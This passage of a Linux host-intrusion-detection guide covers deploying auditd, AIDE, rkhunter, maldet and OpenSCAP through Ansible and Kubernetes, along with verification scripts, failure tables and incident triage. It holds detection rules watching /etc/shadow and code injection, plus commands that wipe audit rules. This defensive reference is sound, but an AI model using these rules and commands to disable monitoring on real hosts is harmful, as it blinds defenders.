RandomizedDelaySec=90m
Persistent=true
Unit=security-scan.service

[Install]
WantedBy=timers.target
```

`/etc/systemd/system/oscap-scan.timer` (weekly, compliance is slower-moving):

```ini
[Unit]
Description=Weekly OpenSCAP compliance evaluation

[Timer]
OnCalendar=Sun *-*-* 02:00:00
RandomizedDelaySec=4h
Persistent=true
Unit=oscap-scan.service

[Install]
WantedBy=timers.target
```

```
$ sudo systemctl daemon-reload
$ sudo systemctl enable --now aide-check.timer security-scan.timer oscap-scan.timer
$ systemctl list-timers --all | grep -E 'aide|security-scan|oscap'
NEXT                         LEFT       LAST                         PASSED    UNIT                ACTIVATES
Mon 2026-08-25 04:12:41 -03  16h        Sun 2026-08-24 03:58:03 -03  8h ago    aide-check.timer    aide-check.service
Mon 2026-08-25 05:07:19 -03  17h        Sun 2026-08-24 04:41:22 -03  7h ago    security-scan.timer security-scan.service
Sun 2026-08-30 05:33:02 -03  6 days     Sun 2026-08-23 04:10:55 -03  1 day ago oscap-scan.timer    oscap-scan.service
```

**Classic cron equivalent** (still exam-relevant, and correct where systemd is absent) — `/etc/cron.d/host-ids`:

```cron
MAILTO=sec-oncall@example.net
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
RANDOM_DELAY=60

# m  h dom mon dow  user  command
  30 3  *   *   *   root  /usr/sbin/aide --config /etc/aide.conf --check
  15 4  *   *   *   root  /usr/bin/rkhunter --update --nocolors >/dev/null 2>&1 && \
                          /usr/bin/rkhunter --cronjob --report-warnings-only
  45 4  *   *   *   root  /usr/sbin/chkrootkit -q
   0 5  *   *   *   root  /usr/local/sbin/maldet -b -u && /usr/local/sbin/maldet -b -r /var/www 2
   0 2  *   *   0   root  /usr/local/sbin/oscap-weekly.sh
```

`MAILTO` only helps if an MTA exists and delivers — verify with a deliberate failure before trusting it. `RANDOM_DELAY` (cronie) is the cron analogue of `RandomizedDelaySec`.

### 7.2 Complete Ansible role: deploy the full stack

```yaml
---
# roles/host_ids/tasks/main.yml
- name: Install host intrusion detection stack
  ansible.builtin.package:
    name:
      - audit
      - audispd-plugins
      - aide
      - rkhunter
      - chkrootkit
      - openscap-scanner
      - scap-security-guide
      - clamav
      - clamav-update
    state: present
  tags: [hids, packages]

- name: Ensure the audit log has its own filesystem
  ansible.builtin.assert:
    that:
      - ansible_mounts | selectattr('mount', 'equalto', '/var/log/audit') | list | length > 0
    fail_msg: >-
      /var/log/audit is not a separate mount. A filling root filesystem will
      stop audit collection or, with disk_full_action=HALT, take the node down.
  tags: [hids, audit]

- name: Set kernel audit boot parameters
  ansible.builtin.command:
    cmd: grubby --update-kernel=ALL --args="audit=1 audit_backlog_limit=16384"
  register: grubby_result
  changed_when: grubby_result.rc == 0
  notify: reboot required
  tags: [hids, audit]

- name: Deploy auditd configuration
  ansible.builtin.template:
    src: auditd.conf.j2
    dest: /etc/audit/auditd.conf
    owner: root
    group: root
    mode: '0640'
  notify: restart auditd
  tags: [hids, audit]

- name: Deploy audit rule fragments
  ansible.builtin.copy:
    src: "rules.d/{{ item }}"
    dest: "/etc/audit/rules.d/{{ item }}"
    owner: root
    group: root
    mode: '0600'
  loop:
    - 10-base.rules
    - 30-identity-and-config.rules
    - 40-execution.rules
    - 99-finalize.rules
  notify: reload audit rules
  tags: [hids, audit]

- name: Configure remote audit forwarding
  ansible.builtin.template:
    src: "{{ item.src }}"
    dest: "{{ item.dest }}"
    owner: root
    group: root
    mode: '0640'
  loop:
    - { src: au-remote.conf.j2,      dest: /etc/audit/plugins.d/au-remote.conf }
    - { src: audisp-remote.conf.j2,  dest: /etc/audit/audisp-remote.conf }
  notify: restart auditd
  tags: [hids, audit]

- name: Enable and start auditd
  ansible.builtin.service:
    name: auditd
    enabled: true
    state: started
  tags: [hids, audit]

- name: Deploy AIDE configuration
  ansible.builtin.template:
    src: aide.conf.j2
    dest: /etc/aide.conf
    owner: root
    group: root
    mode: '0600'
    validate: '/usr/sbin/aide --config-check --config %s'
  register: aide_conf
  tags: [hids, aide]

- name: Check whether an AIDE database already exists
  ansible.builtin.stat:
    path: /var/lib/aide/aide.db.gz
  register: aide_db
  tags: [hids, aide]

# Initialisation is deliberately NOT automatic on every run: re-baselining a
# possibly-compromised host must be a human decision. It runs only on a host
# with no database, or when explicitly forced.
- name: Initialise AIDE database (first run only)
  when: not aide_db.stat.exists or (aide_force_init | default(false))
  block:
    - name: Run aide --init
      ansible.builtin.command:
        cmd: /usr/sbin/aide --config /etc/aide.conf --init
      register: aide_init
      changed_when: aide_init.rc == 0
      async: 7200
      poll: 30

    - name: Promote the new database to the active baseline
      ansible.builtin.command:
        cmd: mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz
      changed_when: true

    - name: Record the baseline digest for off-host verification
      ansible.builtin.shell:
        cmd: sha512sum /var/lib/aide/aide.db.gz > /var/lib/aide/aide.db.gz.sha512
      changed_when: true

    - name: Fetch the baseline to the control node's evidence store
      ansible.builtin.fetch:
        src: "{{ item }}"
        dest: "evidence/aide/{{ inventory_hostname }}/"
        flat: true
      loop:
        - /var/lib/aide/aide.db.gz
        - /var/lib/aide/aide.db.gz.sha512
  tags: [hids, aide]

- name: Deploy rkhunter local configuration
  ansible.builtin.template:
    src: rkhunter.conf.local.j2
    dest: /etc/rkhunter.conf.local
    owner: root
    group: root
    mode: '0640'
    validate: '/usr/bin/rkhunter --config-check --configfile %s'
  notify: rkhunter propupd
  tags: [hids, rkhunter]

- name: Update rkhunter data files
  ansible.builtin.command:
    cmd: /usr/bin/rkhunter --update --nocolors
  register: rkh_update
  changed_when: "'Updated' in rkh_update.stdout"
  failed_when: rkh_update.rc not in [0, 2]
  tags: [hids, rkhunter]

- name: Raise the inotify watch ceiling for real-time malware monitoring
  ansible.posix.sysctl:
    name: fs.inotify.max_user_watches
    value: '524288'
    sysctl_file: /etc/sysctl.d/60-hids.conf
    state: present
    reload: true
  when: maldet_monitor_paths | default([]) | length > 0
  tags: [hids, maldet]

- name: Deploy scan units and timers
  ansible.builtin.copy:
    src: "systemd/{{ item }}"
    dest: "/etc/systemd/system/{{ item }}"
    owner: root
    group: root
    mode: '0644'
  loop:
    - aide-check.service
    - aide-check.timer
    - security-scan.service
    - security-scan.timer
    - oscap-scan.service
    - oscap-scan.timer
  notify: daemon reload
  tags: [hids, schedule]

- name: Enable scan timers
  ansible.builtin.systemd:
    name: "{{ item }}"
    enabled: true
    state: started
    daemon_reload: true
  loop:
    - aide-check.timer
    - security-scan.timer
    - oscap-scan.timer
  tags: [hids, schedule]

- name: Deploy the OpenSCAP tailoring file
  ansible.builtin.copy:
    src: "tailoring-{{ hids_scap_role }}.xml"
    dest: /etc/oscap/tailoring.xml
    owner: root
    group: root
    mode: '0644'
  tags: [hids, oscap]

- name: Run a baseline compliance evaluation
  ansible.builtin.command:
    cmd: >-
      oscap xccdf eval
      --tailoring-file /etc/oscap/tailoring.xml
      --profile {{ hids_scap_profile }}
      --results-arf /var/lib/oscap/arf-baseline.xml
      --report /var/lib/oscap/report-baseline.html
      /usr/share/xml/scap/ssg/content/ssg-{{ hids_scap_content }}-ds.xml
  register: oscap_result
  changed_when: false
  failed_when: oscap_result.rc == 1        # 1 = scanner error; 2 = rules failed
  tags: [hids, oscap]

- name: Collect compliance evidence
  ansible.builtin.fetch:
    src: /var/lib/oscap/arf-baseline.xml
    dest: "evidence/oscap/{{ inventory_hostname }}/"
    flat: true
  tags: [hids, oscap]
```

```yaml
---
# roles/host_ids/handlers/main.yml
- name: daemon reload
  ansible.builtin.systemd:
    daemon_reload: true

- name: reload audit rules
  ansible.builtin.command:
    cmd: /sbin/augenrules --load
  register: augenrules
  # Exit 1 with "unable to unload" is expected under -e 2 (immutable):
  # the running rules stay until reboot, which is the designed behaviour.
  failed_when: augenrules.rc != 0 and 'Rules unable to be unloaded' not in augenrules.stderr

- name: restart auditd
  # NOT systemctl: the RHEL auditd unit sets RefuseManualStop=yes, so
  # `systemctl restart auditd` fails. The SysV wrapper handles it correctly.
  ansible.builtin.command:
    cmd: /sbin/service auditd restart
  when: ansible_os_family == 'RedHat'

- name: restart auditd (debian)
  ansible.builtin.systemd:
    name: auditd
    state: restarted
  when: ansible_os_family == 'Debian'

- name: rkhunter propupd
  ansible.builtin.command:
    cmd: /usr/bin/rkhunter --propupd --nocolors
  # Only safe here because this handler fires from a controlled config change
  # on a host we are actively provisioning. Never schedule it.

- name: reboot required
  ansible.builtin.debug:
    msg: >-
      Kernel audit parameters changed. A reboot is required for audit=1 and
      audit_backlog_limit to take effect. Schedule it through change control.
```

```yaml
---
# roles/host_ids/defaults/main.yml
hids_audit_collector: audit-collector.sec.example.net
hids_audit_collector_port: 60
hids_audit_transport: KRB5
hids_scap_content: rhel9
hids_scap_role: k8s-worker
hids_scap_profile: xccdf_net.example_profile_cis_server_l1_customized
hids_alert_email: sec-oncall@example.net
aide_force_init: false
maldet_monitor_paths: []
```

### 7.3 Kubernetes: node-level evidence collection

Container workloads do not remove the need for a node HIDS — they concentrate it, because one compromised node exposes every pod's service account token. Two distinct audit systems are involved and conflating them is a common architectural error:

| | Kernel audit (`auditd`) | Kubernetes API audit |
|---|---|---|
| Records | syscalls, file access, process execution on the node | REST requests to `kube-apiserver` |
| Configured by | `/etc/audit/rules.d/*.rules` | `--audit-policy-file` on the API server |
| Scope | one node | whole cluster control plane |
| Sees a container escape | **Yes** | No |
| Sees `kubectl create clusterrolebinding` | No | **Yes** |

You need both.

`node-audit-shipper.yaml` — collect kernel audit + HIDS reports from every node:

```yaml
---
apiVersion: v1
kind: Namespace
metadata:
  name: security-agents
  labels:
    pod-security.kubernetes.io/enforce: privileged
    pod-security.kubernetes.io/audit: privileged
    pod-security.kubernetes.io/warn: privileged
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: node-audit-shipper
  namespace: security-agents
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: node-audit-shipper-config
  namespace: security-agents
data:
  fluent-bit.conf: |
    [SERVICE]
        Flush              5
        Daemon             Off
        Log_Level          info
        Parsers_File       parsers.conf
        HTTP_Server        On
        HTTP_Listen        0.0.0.0
        HTTP_Port          2020
        storage.path       /var/lib/fluent-bit/storage
        storage.sync       normal
        storage.checksum   on
        storage.backlog.mem_limit 64M

    [INPUT]
        Name               tail
        Tag                host.audit
        Path               /var/log/audit/audit.log
        Parser             auditd
        DB                 /var/lib/fluent-bit/audit.db
        Mem_Buf_Limit      32MB
        Skip_Long_Lines    On
        Refresh_Interval   5
        storage.type       filesystem

    [INPUT]
        Name               tail
        Tag                host.aide
        Path               /var/log/aide/aide-check.log
        Multiline.parser   aide_report
        DB                 /var/lib/fluent-bit/aide.db
        storage.type       filesystem

    [INPUT]
        Name               tail
        Tag                host.rkhunter
        Path               /var/log/rkhunter.log
        DB                 /var/lib/fluent-bit/rkhunter.db
        storage.type       filesystem

    [FILTER]
        Name               record_modifier
        Match              host.*
        Record             node_name    ${NODE_NAME}
        Record             cluster_name ${CLUSTER_NAME}

    [OUTPUT]
        Name               opensearch
        Match              host.*
        Host               siem-ingest.sec.example.net
        Port               9200
        tls                On
        tls.verify         On
        tls.ca_file        /etc/ssl/certs/internal-ca.pem
        HTTP_User          ${SIEM_USER}
        HTTP_Passwd        ${SIEM_PASSWORD}
        Index              host-security
        Logstash_Format    On
        Logstash_Prefix    host-security
        Retry_Limit        False

  parsers.conf: |
    [PARSER]
        Name         auditd
        Format       regex
        Regex        ^type=(?<record_type>[A-Z_]+) msg=audit\((?<epoch>[0-9.]+):(?<serial>[0-9]+)\): (?<body>.*)$
        Time_Key     epoch
        Time_Format  %s.%L

    [MULTILINE_PARSER]
        Name         aide_report
        Type         regex
        Flush        5
        Rule         "start_state"  "^(Start timestamp|AIDE found)"  "cont"
        Rule         "cont"         "^(?!Start timestamp).*"          "cont"
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-audit-shipper
  namespace: security-agents
  labels:
    app.kubernetes.io/name: node-audit-shipper
    app.kubernetes.io/component: hids
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: node-audit-shipper
  updateStrategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 25%
  template:
    metadata:
      labels:
        app.kubernetes.io/name: node-audit-shipper
      annotations:
        container.apparmor.security.beta.kubernetes.io/fluent-bit: runtime/default
    spec:
      serviceAccountName: node-audit-shipper
      priorityClassName: system-node-critical
      hostNetwork: false
      dnsPolicy: ClusterFirst
      terminationGracePeriodSeconds: 30
      tolerations:
        - operator: Exists
      securityContext:
        runAsNonRoot: false
        runAsUser: 0
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: fluent-bit
          image: cr.fluentbit.io/fluent/fluent-bit:3.1.9
          imagePullPolicy: IfNotPresent
          args: ["--config=/fluent-bit/etc/fluent-bit.conf"]
          env:
            - name: NODE_NAME
              valueFrom:
                fieldRef:
                  fieldPath: spec.nodeName
            - name: CLUSTER_NAME
              value: prod-eu-west-1
            - name: SIEM_USER
              valueFrom:
                secretKeyRef:
                  name: siem-credentials
                  key: username
            - name: SIEM_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: siem-credentials
                  key: password
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop: ["ALL"]
              add: ["DAC_READ_SEARCH"]
          resources:
            requests:
              cpu: 50m
              memory: 128Mi
            limits:
              memory: 512Mi
          livenessProbe:
            httpGet:
              path: /
              port: 2020
            initialDelaySeconds: 30
            periodSeconds: 30
          volumeMounts:
            - name: config
              mountPath: /fluent-bit/etc/
            - name: audit-logs
              mountPath: /var/log/audit
              readOnly: true
            - name: aide-logs
              mountPath: /var/log/aide
              readOnly: true
            - name: rkhunter-log
              mountPath: /var/log/rkhunter.log
              readOnly: true
            - name: state
              mountPath: /var/lib/fluent-bit
            - name: internal-ca
              mountPath: /etc/ssl/certs/internal-ca.pem
              subPath: ca.pem
              readOnly: true
      volumes:
        - name: config
          configMap:
            name: node-audit-shipper-config
        - name: audit-logs
          hostPath:
            path: /var/log/audit
            type: Directory
        - name: aide-logs
          hostPath:
            path: /var/log/aide
            type: DirectoryOrCreate
        - name: rkhunter-log
          hostPath:
            path: /var/log/rkhunter.log
            type: FileOrCreate
        - name: state
          hostPath:
            path: /var/lib/fluent-bit
            type: DirectoryOrCreate
        - name: internal-ca
          configMap:
            name: internal-ca
```

Note `readOnly: true` on every evidence mount and `readOnlyRootFilesystem: true` on the container: the shipper is a read path. A collector that can write to `/var/log/audit` is a log-tampering primitive handed to whoever compromises the collector.

**Kubernetes API audit policy** (`/etc/kubernetes/audit-policy.yaml`, referenced by `--audit-policy-file`):

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
omitStages:
  - RequestReceived
rules:
  # Never log the contents of secrets — the audit log would become a
  # credential store readable by everyone with log access.
  - level: Metadata
    resources:
      - group: ""
        resources: ["secrets", "configmaps"]

  # Full request+response for RBAC changes: privilege escalation lives here.
  - level: RequestResponse
    verbs: ["create", "update", "patch", "delete"]
    resources:
      - group: "rbac.authorization.k8s.io"
        resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]

  # Exec/attach/port-forward into a pod is the container equivalent of an
  # interactive shell. Always full detail.
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["pods/exec", "pods/attach", "pods/portforward"]

  # Workload mutations that could mount the host or gain privileges.
  - level: Request
    verbs: ["create", "update", "patch"]
    resources:
      - group: ""
        resources: ["pods"]
      - group: "apps"
        resources: ["deployments", "daemonsets", "statefulsets"]

  # Anonymous and unauthenticated access attempts.
  - level: Request
    userGroups: ["system:unauthenticated", "system:anonymous"]

  # Drop the high-volume control-plane read chatter that would otherwise be 95%
  # of the log volume.
  - level: None
    users: ["system:kube-scheduler", "system:kube-controller-manager", "system:apiserver"]
    verbs: ["get", "list", "watch"]

  - level: None
    resources:
      - group: ""
        resources: ["events", "endpoints"]
      - group: "coordination.k8s.io"
        resources: ["leases"]

  # Catch-all.
  - level: Metadata
```

---

## 8. Verification and failure diagnosis

### 8.1 End-to-end verification script

```bash
#!/usr/bin/env bash
# /usr/local/sbin/hids-verify.sh — prove the detection stack is actually working.
set -uo pipefail
fail=0
ok()   { printf '  \033[32m✓\033[0m %s\n' "$*"; }
bad()  { printf '  \033[31m✗\033[0m %s\n' "$*"; fail=$((fail+1)); }

echo "== 1. Kernel audit =="
auditctl -s | grep -q '^enabled [12]$' && ok "audit enabled" || bad "audit DISABLED"
grep -qw 'audit=1' /proc/cmdline && ok "audit=1 on cmdline" || bad "early-boot events lost (audit=1 missing)"
lost=$(auditctl -s | awk '/^lost/{print $2}')
[ "$lost" -eq 0 ] && ok "lost=0" || bad "lost=$lost — backlog too small or disk too slow"
[ "$(auditctl -l | wc -l)" -gt 20 ] && ok "$(auditctl -l | wc -l) rules loaded" || bad "rule set not loaded"
auditctl -s | grep -q '^enabled 2$' && ok "rules immutable (-e 2)" || bad "rules are mutable"

echo "== 2. Audit trail is actually written =="
marker="hids-verify-$$"
auditctl -w /etc/hosts -p r -k "$marker" 2>/dev/null || true
cat /etc/hosts >/dev/null
sleep 2
ausearch -k "$marker" -ts recent >/dev/null 2>&1 \
  && ok "synthetic event round-tripped to disk" \
  || bad "rule fired but no record on disk — check auditd/dispatcher"
auditctl -W /etc/hosts -p r -k "$marker" 2>/dev/null || true

echo "== 3. Remote forwarding =="
if [ -f /etc/audit/plugins.d/au-remote.conf ] && grep -q '^active *= *yes' /etc/audit/plugins.d/au-remote.conf; then
  pgrep -f audisp-remote >/dev/null && ok "audisp-remote running" || bad "au-remote active but not running"
  q=$(stat -c %s /var/spool/audit/remote.q 2>/dev/null || echo 0)
  [ "$q" -lt 1048576 ] && ok "remote queue drained ($q bytes)" || bad "remote queue backing up ($q bytes) — collector unreachable?"
else
  bad "no remote forwarding configured — evidence dies with the host"
fi

echo "== 4. AIDE =="
[ -f /var/lib/aide/aide.db.gz ] && ok "baseline present" || bad "NO BASELINE — aide --check is a no-op"
age=$(( ($(date +%s) - $(stat -c %Y /var/log/aide/aide-check.log 2>/dev/null || echo 0)) / 3600 ))
[ "$age" -lt 30 ] && ok "last check ${age}h ago" || bad "last check ${age}h ago — timer not firing"
aide --config-check && ok "config parses" || bad "aide.conf invalid"

echo "== 5. Rootkit scanners =="
[ -f /var/lib/rkhunter/db/rkhunter.dat ] && ok "rkhunter property DB present" || bad "run rkhunter --propupd"
dbage=$(( ($(date +%s) - $(stat -c %Y /var/lib/rkhunter/db/rkhunter.dat 2>/dev/null || echo 0)) / 86400 ))
[ "$dbage" -lt 45 ] && ok "property DB ${dbage}d old" || bad "property DB stale (${dbage}d)"
command -v chkrootkit >/dev/null && ok "chkrootkit installed" || bad "chkrootkit missing"

echo "== 6. Compliance =="
newest=$(ls -t /var/lib/oscap/arf-*.xml 2>/dev/null | head -1)
if [ -n "$newest" ]; then
  f=$(xmllint --xpath 'count(//*[local-name()="rule-result"][*[local-name()="result"]="fail"])' "$newest" 2>/dev/null)
  ok "latest ARF $(basename "$newest"): $f failing rules"
else
  bad "no ARF results — oscap has never run"
fi

echo "== 7. Log volume headroom =="
use=$(df --output=pcent /var/log/audit | tail -1 | tr -dc '0-9')
[ "$use" -lt 80 ] && ok "/var/log/audit ${use}% used" || bad "/var/log/audit ${use}% used — space_left_action imminent"

exit $((fail > 0))
```

```
$ sudo /usr/local/sbin/hids-verify.sh
== 1. Kernel audit ==
  ✓ audit enabled
  ✓ audit=1 on cmdline
  ✗ lost=1183 — backlog too small or disk too slow
  ✓ 96 rules loaded
  ✓ rules immutable (-e 2)
== 2. Audit trail is actually written ==
  ✓ synthetic event round-tripped to disk
...
$ echo $?
1
```

### 8.2 Failure catalogue

#### Linux Audit

| Symptom | Root cause | Diagnosis | Fix |
|---|---|---|---|
| `auditd` starts, nothing in `audit.log` | Another process owns the audit netlink socket | `auditctl -s` → `Error sending status request (Operation not permitted)`; `ss -f netlink \| grep audit` | Stop the competing agent; only one audit daemon per kernel |
| `auditctl -l` shows `No rules` after boot | `augenrules` not run, or a syntax error aborted the load | `journalctl -u auditd -b`; `augenrules --check` | Fix the fragment; `augenrules --load` |
| `lost` counter climbing | Backlog too small, or disk cannot absorb the write rate | `auditctl -s`; `dmesg \| grep -i 'audit.*backlog'` | Raise `-b`, add `audit_backlog_limit=` to cmdline, put `/var/log/audit` on faster storage, or narrow the `execve` rule |
| `dmesg`: `audit: backlog limit exceeded` | Same, at boot before `auditd` starts | `grep audit /proc/cmdline` | Add `audit_backlog_limit=16384` via `grubby`/GRUB |
| `auditctl -D` → `Operation not permitted` | Immutable mode (`-e 2`) — **working as designed** | `auditctl -s` shows `enabled 2` | Change `rules.d`, reboot |
| `systemctl restart auditd` → `Operation refused` | RHEL unit sets `RefuseManualStop=yes` | `systemctl cat auditd` | `service auditd restart`, or `systemctl kill -s SIGHUP auditd` for a config reload |
| Rules load but the watched file is never reported | Watch on a path replaced wholesale; inode changed | `auditctl -l \| grep <path>`; `stat` the file | Use `-a always,exit -F dir=` instead of `-w` |
| `auid=unset` on everything | `pam_loginuid` missing from the PAM stack | `grep -r pam_loginuid /etc/pam.d/` | Add `session required pam_loginuid.so` to `sshd`, `login`, `crond` |
| `ausearch` returns nothing for a known event | Searching a rotated log; or wrong time zone | `ausearch --input-logs -k <key>`; `ls /var/log/audit/` | Use `--input-logs`, or `-if /var/log/audit/audit.log.3` |
| Node dropped to single-user overnight | `admin_space_left_action = SINGLE` fired | `journalctl -b -1 \| grep -i audit` | Separate LV for `/var/log/audit`, monitor it, use `SYSLOG`/`EMAIL` + pager |
| Kernel panic under load | `-f 2` and a full backlog | Serial console / crash dump | Change to `-f 1` unless the panic is a deliberate policy |
| Massive log growth from one binary | A daemon in a hot loop matching a broad rule | `aureport -x --summary -i \| head` | Add a targeted `-a never,exit -F exe=<path>` **before** the broad rule |

```
$ sudo aureport -x --summary -i | head -6
Executable Summary Report
=================================
total  file
=================================
418922 /usr/bin/kubectl
 21883 /usr/bin/bash
  4110 /usr/bin/sudo
```

418 922 `kubectl` executions is an automation loop, not a human. Either exclude that service account's `auid` or exclude the binary — but document the blind spot you just created.

```
$ sudo auditctl --reset-lost
audit: lost=1183
$ sudo auditctl -b 32768        # only possible if not in immutable mode
$ dmesg | grep -i 'audit.*backlog' | tail -2
[  892.114532] audit: backlog limit exceeded
[  892.114540] audit: audit_backlog=16385 > audit_backlog_limit=16384
```

#### AIDE

| Symptom | Root cause | Fix |
|---|---|---|
| Thousands of changed files after a maintenance window | Package updates — legitimate | Review, then `aide --update` and promote. Correlate against `dnf history` / `apt list --installed` |
| Every binary changes on every run with identical size | `prelink` rewriting binaries | `prelink -ua` and disable it (removed on RHEL 8+) |
| `Attribute not present in database` for all entries | Config attributes changed without re-init | `aide --init` and promote a fresh baseline |
| Check takes 6+ hours | Hashing container storage or large data volumes | Add `!/var/lib/containerd`, `!/var/lib/docker`, `!/var/lib/kubelet` exclusions |
| `--check` reports nothing, ever | Database missing/empty; `ConditionPathExists` skipped the unit | `systemctl status aide-check.service`; verify `/var/lib/aide/aide.db.gz` |
| Removed entries for `/var/log/*.1.gz` daily | `logrotate` renaming files | Exclude rotated names or use the `>` growing-log rule |
| Report never reaches anyone | `report_url=stdout` with no capture | Add `report_url=syslog:LOG_AUTH` and a shipper |
| `Configuration error: ...` on Debian | Editing `/etc/aide/aide.conf` instead of `aide.conf.d/` | Use `update-aide.conf`, then `aideinit` |

```
$ sudo aide --config-check
1094:Configuration error: unknown attribute 'sha3_256' in rule 'BIN'
$ sudo aide --check 2>&1 | tail -3
Number of entries:	68941
End timestamp: 2026-08-24 04:06:11 -0300 (run time: 6m 4s)
$ echo $?
7
```

AIDE exit status is a bitmask: `1` = new files, `2` = removed files, `4` = changed files (so `7` = all three), and values ≥ 14 are real errors. Automation must decode the bitmask rather than testing `!= 0` — otherwise a normal detection looks identical to a crashed scanner.

#### rkhunter / chkrootkit

| Symptom | Root cause | Fix |
|---|---|---|
| `--update` does nothing / hangs | `WEB_CMD=/bin/false` (Debian default) or egress blocked | Set `WEB_CMD=""`, or `WEB_CMD="/usr/bin/curl -x proxy:3128 -sfL"`; verify egress |
| Warnings for every binary after patching | Property DB predates the updates | Verify with `rpm -Va` / `dpkg -V`, then `rkhunter --propupd` |
| `Warning: Hidden directory found: /etc/.java` | Legitimate hidden dirs | `ALLOWHIDDENDIR=/etc/.java` in `rkhunter.conf.local` |
| `INFECTED (PORTS: 465)` from chkrootkit | Known false positive (SMTPS/portsentry) | Confirm with `ss -lntp`; ignore once identified |
| `chkproc: Possible LKM Trojan installed` on every run | PID namespaces / process race on a container host | Re-run to confirm; if persistent, cross-check with `unhide proc sys brute` |
| Suspicious files under `/dev` | Application state in `/dev/shm` | `ALLOWDEVFILE=` entries |
| `--propupd` was run automatically | Cron/config misconfiguration — **the DB may now bless a compromise** | Re-baseline from a known-good image; treat the interval as unmonitored |

```
$ sudo ss -lntp | grep ':465'
LISTEN 0  100  0.0.0.0:465  0.0.0.0:*  users:(("master",pid=1147,fd=20))
$ sudo rkhunter --config-check --configfile /etc/rkhunter.conf.local
$ sudo unhide proc sys brute 2>&1 | tail -5
[*]Searching for Hidden processes through comparison of results of system calls, proc, dir and sys
[*]Starting scanning using brute force against PIDS with fork()
Found HIDDEN PID: 24917
```

A hidden PID confirmed by `unhide` after `chkproc` flagged it is not a container artefact. Isolate the node, capture memory, do not reboot.

#### maldet

| Symptom | Root cause | Fix |
|---|---|---|
| `inotify` monitoring never starts | `fs.inotify.max_user_watches` too low | `sysctl fs.inotify.max_user_watches=524288`; lower `inotify_base_watches` |
| Scan runs for hours | `scan_max_filesize` too high, or scanning container layers | Cap at `2048k`; add `ignore_paths` entries |
| Legitimate app files quarantined | Signature FP (obfuscated JS, PHP test fixtures) | `maldet --restore`, then add to `ignore_paths` or `ignore_sigs` |
| Signature updates fail | Egress blocked to `cdn.rfxn.com` | Mirror the signature pack internally; `maldet -u` from the mirror |
| Site broken after a scan | `quarantine_clean="1"` modified files in place | Set to `0`; restore from backup, not from the "cleaned" file |

```
$ sysctl fs.inotify.max_user_watches
fs.inotify.max_user_watches = 8192
$ sudo tail -3 /usr/local/maldetect/logs/event_log
Aug 24 05:02:11 web-07 maldet(31980): {mon} inotify max_user_watches (8192) is lower than
                                       inotify_base_watches (80000), aborting
```

#### OpenSCAP

| Symptom | Root cause | Fix |
|---|---|---|
| `OpenSCAP Error: Could not parse the XCCDF file` | Content version mismatch with the OS | `oscap info` the file; install the matching `ssg-*` package |
| Every rule `notapplicable` | CPE platform check failing (wrong content, or scanning a container as a VM) | Confirm `/etc/os-release`; use the right `ssg-<distro><ver>-ds.xml` |
| `Unable to fetch remote resources` | Profile references an external OVAL feed offline | `--fetch-remote-resources` with egress, or mirror the feed locally |
| Exit `1` in CI mistaken for a policy failure | Not distinguishing scanner error from rule failure | Test `rc == 1` (error) separately from `rc == 2` (rules failed) |
| Node broken after `--remediate` | STIG remediations reconfigured PAM/SSH/mount options | Never auto-remediate production; stage the generated Ansible |
| Results differ between two "identical" nodes | One node has a stale tailoring file or content package | `rpm -q scap-security-guide` and `sha256sum` the tailoring file on both |

```
$ sudo oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_stig \
      /usr/share/xml/scap/ssg/content/ssg-rhel8-ds.xml
OpenSCAP Error: Could not parse the XCCDF file: /usr/share/xml/scap/ssg/content/ssg-rhel8-ds.xml
$ cat /etc/os-release | head -2
NAME="Red Hat Enterprise Linux"
VERSION="9.4 (Plow)"
$ rpm -q scap-security-guide
scap-security-guide-0.1.73-1.el9.noarch
$ ls /usr/share/xml/scap/ssg/content/ | grep rhel9
ssg-rhel9-ds.xml
```

Wrong content file for the OS — a five-second fix that regularly costs an hour because the error message names parsing, not applicability.

### 8.3 Triage decision tree

```
AIDE reports a changed system binary
        │
        ├─ Does the package manager verify it?
        │    rpm -V <pkg>   /   dpkg -V <pkg>   /   debsums -c
        │        ├─ clean ──► package update. Correlate `dnf history` /
        │        │            /var/log/apt/history.log with the mtime.
        │        │            → accept, aide --update, rkhunter --propupd
        │        └─ FAILS ──▼
        │
        ├─ Who touched it?  ausearch -f <path> -i
        │        ├─ known change-management window + expected auid ──► accept
        │        └─ unknown auid, or auid=unset ──▼
        │
        ├─ What ran at that time?  ausearch -k exec -ts <time> -te <time+5min> -i
        ├─ Was a module loaded?    ausearch -k module_load -i
        ├─ Was there ptrace?       ausearch -k code_injection -i
        │
        └──► ISOLATE (cordon + drain + network quarantine, do NOT power off:
             memory is evidence). Snapshot the volume. Escalate to IR.
             Rebuild from a known-good image — never "clean" in place.
```

Two rules that survive contact with real incidents: **do not reboot** (volatile memory is where the implant lives, and the audit trail of the reboot is worth less than the memory image), and **do not remediate in place** (you cannot prove you removed everything; you can prove you redeployed a signed image).

---

## 9. Quick reference

| Task | Command |
|---|---|
| Kernel audit status | `auditctl -s` |
| List active rules | `auditctl -l` |
| Load rules from `rules.d` | `augenrules --load` |
| Add a watch at runtime | `auditctl -w /etc/shadow -p wa -k identity` |
| Remove all rules | `auditctl -D` (blocked under `-e 2`) |
| Make rules immutable | `-e 2` as the last line of `audit.rules` |
| Search by key, interpreted | `ausearch -k <key> -i -ts today` |
| Search by file / user / exe | `ausearch -f <path>` / `-ua <user>` / `-x <binary>` |
| Search rotated logs | `ausearch --input-logs -k <key>` |
| Summary report | `aureport --summary -i` |
| Failed authentications | `aureport -au --summary -i --failed` |
| Per-key totals | `aureport -k --summary -i` |
| TTY keystroke report | `aureport --tty -i` |
| Trace one program | `auditctl -D; autrace /path/to/bin; ausearch -p <pid>` |
| AIDE: validate config | `aide --config-check` |
| AIDE: create baseline | `aide --init` then move `.new.gz` over `.db.gz` |
